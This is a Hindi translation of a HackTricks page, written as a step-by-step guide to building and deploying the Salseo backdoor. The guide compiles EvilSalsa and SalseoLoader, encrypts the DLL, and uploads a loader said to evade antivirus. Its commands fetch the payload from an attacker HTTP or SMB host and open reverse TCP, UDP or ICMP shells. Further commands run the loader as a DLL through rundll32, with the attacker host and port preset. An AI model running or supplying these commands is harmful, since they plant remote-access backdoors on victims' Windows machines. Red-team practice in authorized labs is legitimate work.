# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## बाइनरी संकलन करना

गिटहब से स्रोत कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** संकलित करें। आपको कोड संकलित करने के लिए **Visual Studio** स्थापित करने की आवश्यकता होगी।

उन परियोजनाओं को उस विंडोज बॉक्स की आर्किटेक्चर के लिए संकलित करें जहाँ आप उनका उपयोग करने जा रहे हैं (यदि विंडोज x64 का समर्थन करता है तो उन्हें उस आर्किटेक्चर के लिए संकलित करें)।

आप **Visual Studio** में **बाएँ "Build" टैब** में **"Platform Target"** के अंदर **आर्किटेक्चर का चयन** कर सकते हैं।

(\*\*यदि आप ये विकल्प नहीं पा रहे हैं तो **"Project Tab"** पर क्लिक करें और फिर **"\<Project Name> Properties"** पर क्लिक करें)

![](<../.gitbook/assets/image (839).png>)

फिर, दोनों परियोजनाओं का निर्माण करें (Build -> Build Solution) (लॉग के अंदर निष्पादन योग्य का पथ दिखाई देगा):

![](<../.gitbook/assets/image (381).png>)

## बैकडोर तैयार करें

सबसे पहले, आपको **EvilSalsa.dll** को एन्कोड करने की आवश्यकता होगी। ऐसा करने के लिए, आप पायथन स्क्रिप्ट **encrypterassembly.py** का उपयोग कर सकते हैं या आप परियोजना **EncrypterAssembly** को संकलित कर सकते हैं:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### विंडोज
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
ठीक है, अब आपके पास Salseo चीज़ों को निष्पादित करने के लिए आवश्यक सभी चीज़ें हैं: **encoded EvilDalsa.dll** और **SalseoLoader का बाइनरी।**

**SalseoLoader.exe बाइनरी को मशीन पर अपलोड करें। उन्हें किसी भी AV द्वारा नहीं पहचाना जाना चाहिए...**

## **बैकडोर निष्पादित करें**

### **TCP रिवर्स शेल प्राप्त करना (HTTP के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शेल लिस्नर के रूप में nc शुरू करें और एन्कोडेड evilsalsa को सर्व करने के लिए एक HTTP सर्वर शुरू करें।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP रिवर्स शेल प्राप्त करना (SMB के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शेल लिस्नर के रूप में एक nc शुरू करें, और एन्कोडेड evilsalsa (impacket-smbserver) को सेवा देने के लिए एक SMB सर्वर शुरू करें।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP रिवर्स शेल प्राप्त करना (विक्टिम के अंदर पहले से एन्कोडेड dll)**

**इस बार आपको क्लाइंट में रिवर्स शेल प्राप्त करने के लिए एक विशेष उपकरण की आवश्यकता है। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP उत्तर बंद करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, चलो salseo चीज़ को निष्पादित करते हैं:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader को DLL के रूप में संकलित करना मुख्य फ़ंक्शन निर्यात कर रहा है

Visual Studio का उपयोग करके SalseoLoader प्रोजेक्ट खोलें।

### मुख्य फ़ंक्शन से पहले जोड़ें: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### इस प्रोजेक्ट के लिए DllExport स्थापित करें

#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

![](<../.gitbook/assets/image (881).png>)

#### **DllExport पैकेज के लिए खोजें (Browse टैब का उपयोग करते हुए), और Install दबाएं (और पॉपअप को स्वीकार करें)**

![](<../.gitbook/assets/image (100).png>)

आपके प्रोजेक्ट फ़ोल्डर में फ़ाइलें प्रकट हुई हैं: **DllExport.bat** और **DllExport\_Configure.bat**

### **U**ninstall DllExport

**Uninstall** दबाएं (हाँ, यह अजीब है लेकिन मुझ पर विश्वास करें, यह आवश्यक है)

![](<../.gitbook/assets/image (97).png>)

### **Visual Studio से बाहर निकलें और DllExport\_configure निष्पादित करें**

बस **बाहर निकलें** Visual Studio

फिर, अपने **SalseoLoader फ़ोल्डर** पर जाएं और **DllExport\_Configure.bat** निष्पादित करें

**x64** चुनें (यदि आप इसे x64 बॉक्स के अंदर उपयोग करने जा रहे हैं, तो यह मेरा मामला था), **System.Runtime.InteropServices** चुनें ( **DllExport** के लिए **Namespace** के अंदर) और **Apply** दबाएं

![](<../.gitbook/assets/image (882).png>)

### **Visual Studio के साथ प्रोजेक्ट फिर से खोलें**

**\[DllExport]** अब त्रुटि के रूप में चिह्नित नहीं होना चाहिए

![](<../.gitbook/assets/image (670).png>)

### समाधान का निर्माण करें

**Output Type = Class Library** चुनें (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](<../.gitbook/assets/image (847).png>)

**x64** **प्लेटफ़ॉर्म** चुनें (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](<../.gitbook/assets/image (285).png>)

**समाधान** बनाने के लिए: Build --> Build Solution (Output कंसोल के अंदर नए DLL का पथ दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

Dll को उस स्थान पर कॉपी और पेस्ट करें जहाँ आप इसका परीक्षण करना चाहते हैं।

निष्पादित करें:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि नहीं आती है, तो शायद आपके पास एक कार्यात्मक DLL है!!

## DLL का उपयोग करके एक शेल प्राप्त करें

**HTTP** **सर्वर** का उपयोग करना न भूलें और एक **nc** **श्रोता** सेट करें

### पॉवरशेल
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **हमारे** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रिपोजिटरी में PRs सबमिट करें।

</details>
{% endhint %}
